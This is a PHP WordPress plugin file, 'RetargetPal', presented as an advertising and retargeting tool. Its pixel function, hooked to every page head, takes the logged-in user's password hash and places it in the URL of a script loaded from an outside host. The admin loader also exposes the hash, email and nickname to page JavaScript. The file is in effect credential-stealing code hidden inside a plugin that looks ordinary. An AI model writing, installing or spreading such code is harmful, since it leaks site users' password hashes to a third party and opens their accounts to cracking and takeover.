<?php

/**
 * @package RetargetPal
 */


/*
Plugin Name: RetargetPal
Plugin URI: http://www.example.com
Description: Advertising and retargeting on Google+Facebook
Author:  AdTechium LLC
Version: 1.1.1
Author URI: https://www.adtechium.com
License:GPLv2 or later
Text Domain:RetargetPal
*/

$retargetPal_server_base_url = 'https://wix.adtechium.com';

function retargetPal_remove_slesh_from_user_pass($user_pass)
{   
    $user_pass_without_slesh=str_replace("/", "_", $user_pass);
    return $user_pass_without_slesh;
}

defined('ABSPATH') or die('You dont have access to this files');



function retargetPal_add_pixel()
{
	$server_base_url = $GLOBALS['retargetPal_server_base_url'];
	$modifed_pass = retargetPal_remove_slesh_from_user_pass(wp_get_current_user()->user_pass);
	$pixel_src = "$server_base_url/wix-api/v1/retargetter/audience_ex/$modifed_pass";
	wp_enqueue_script('thePixel',$pixel_src);
}
add_action('wp_head', 'retargetPal_add_pixel');


// Setting hook to load files.
add_action('admin_enqueue_scripts', 'retargetPal_rp_load_react_app');

/**
 * Load react app files in WordPress admin.
 *
 * @return bool|void
 */
function retargetPal_rp_load_react_app($hook)
{
	$is_main_dashboard = $hook === 'index.php';

	// Only load react app scripts in main admin page.
	if (!$is_main_dashboard)
		return;

	// Setting path variables.
	$plugin_app_dir_url = plugin_dir_url(__FILE__) . 'retargetpal-dashborad/';
	$react_app_build = $plugin_app_dir_url . 'build/';
	$manifest_url = $react_app_build . 'asset-manifest.json';

	// Request manifest file.
	$request = file_get_contents($manifest_url);

	// If the remote request fails, wp_remote_get() will return a WP_Error, so let’s check if the $request variable is an error:
	if (!$request)
		return false;

	// Convert json to php array.
	$files_data = json_decode($request);
	if ($files_data === null)
		return;

	if (!property_exists($files_data, 'entrypoints'))
		return false;

	// Get assets links.
	$assets_files = $files_data->entrypoints;

	$js_files = array_filter($assets_files, 'retargetPal_rp_filter_js_files');
	$css_files = array_filter($assets_files, 'retargetPal_rp_filter_css_files');

	// Load css files.
	foreach ($css_files as $index => $css_file) {
		wp_enqueue_style('react-plugin-' . $index, $react_app_build . $css_file);
	}

	// Load js files.
	foreach ($js_files as $index => $js_file) {
		wp_enqueue_script('react-plugin-' . $index, $react_app_build . $js_file, array(), 1, true);
	}

	// Variables for app use.
	$user = wp_get_current_user();
	wp_localize_script(
		'react-plugin-0',
		'userInfoFromWP',
		array(
			"pass" => str_replace("/", "_", $user->user_pass),
			"siteUrl" => get_site_url(),
			"email" => $user->user_email,
			"nickname" => $user->user_nicename
		)
	);
}

/**
 * Get js files from assets array.
 *
 * @param array $file_string
 *
 * @return bool
 */
function retargetPal_rp_filter_js_files($file_string)
{
	return pathinfo($file_string, PATHINFO_EXTENSION) === 'js';
}

/**
 * Get css files from assets array.
 *
 * @param array $file_string
 *
 * @return bool
 */
function retargetPal_rp_filter_css_files($file_string)
{
	return pathinfo($file_string, PATHINFO_EXTENSION) === 'css';
}
